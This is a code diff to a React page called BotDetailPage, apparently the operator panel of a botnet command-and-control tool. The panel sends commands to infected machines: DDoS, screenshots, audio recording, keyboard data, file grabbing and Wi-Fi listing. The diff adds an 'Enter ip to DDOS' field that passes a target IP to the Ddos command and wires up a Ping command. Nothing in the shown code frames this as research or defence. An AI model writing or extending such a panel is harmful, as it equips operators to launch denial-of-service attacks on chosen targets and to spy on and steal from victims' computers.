@@ -60,14 +60,16 @@ export default function BotDetailPage() {
     const [relay, setRelay] = useState<string>("")
     const [pullingRate, setPullingRate] = useState<number>(10)
 
+    const [ddos, setDdos] = useState<string>("")
 
     const handleCommandChange = (event: React.ChangeEvent<HTMLInputElement>) => setCommand(event.target.value);
     const handleStartIpChange = (event: React.ChangeEvent<HTMLInputElement>) => setStartIp(event.target.value);
     const handleEndIpChange = (event: React.ChangeEvent<HTMLInputElement>) => setEndIp(event.target.value);
     const handlePingChange = (event: React.ChangeEvent<HTMLInputElement>) => setPing(event.target.value);
     const handleRelayChange = (event: React.ChangeEvent<HTMLInputElement>) => setRelay(event.target.value);
-    const handlePullingRateChange = (event: React.ChangeEvent<HTMLInputElement>) => setPullingRate(event.target.value);
+    const handlePullingRateChange = (event: React.ChangeEvent<HTMLInputElement>) => setPullingRate(+event.target.value);
 
+    const handleDdosChange = (event: React.ChangeEvent<HTMLInputElement>) => setDdos(event.target.value);
 
 
     const toast = useToast()
@@ -124,7 +126,11 @@ export default function BotDetailPage() {
     }
 
     async function handlePing() {
-
+        const res = await sendCommand(currentBot, "Ping", {
+            targetIp: ping
+        })
+        commandSent()
+        await getChannel()
     }
 
     async function handleScreen()  {
@@ -197,14 +203,16 @@ export default function BotDetailPage() {
 
     async function handleWifi() {
 
-        const res =  await sendCommand(currentBot, "WifiList", {})
+        const res =  await sendCommand(currentBot, "Wifi", {})
 
         commandSent()
     }
 
     async function handleDdos() {
 
-        const res =  await sendCommand(currentBot, "Ddos", {})
+        const res =  await sendCommand(currentBot, "Ddos", {
+            targetIp: ddos
+        })
         commandSent()
 
     }
@@ -305,7 +313,13 @@ export default function BotDetailPage() {
                         <TabPanel className={"flex gap-2"}>
                             <Button colorScheme='green' onClick={handleKeyboardData}>Grab file</Button>
                             <Button colorScheme='green' onClick={handleKeyboardData}>Send file</Button>
-                            <Button colorScheme='green' onClick={handleDdos}>Ddos</Button>
+                            <InputGroup>
+                                <Input placeholder='Enter ip to DDOS' value={ddos} onChange={handleDdosChange} />
+                                <InputRightElement width='4rem'>
+                                    <Button colorScheme='green' onClick={handleDdos}>Ddos</Button>
+                                </InputRightElement>
+                            </InputGroup>
+
                             <Button colorScheme='green' onClick={handleAudio}>Record audio</Button>
                             <Button colorScheme='green' onClick={handleScreen}>Screenshot</Button>
                         </TabPanel>
@@ -321,7 +335,7 @@ export default function BotDetailPage() {
                             <InputGroup>
                                 <Input placeholder='Enter ip to ping' value={ping} onChange={handlePingChange} />
                                 <InputRightElement width='4rem'>
-                                    <Button colorScheme='yellow'>Ping</Button>
+                                    <Button colorScheme='yellow' onClick={handlePing}>Ping</Button>
                                 </InputRightElement>
                             </InputGroup>
                             <br/>
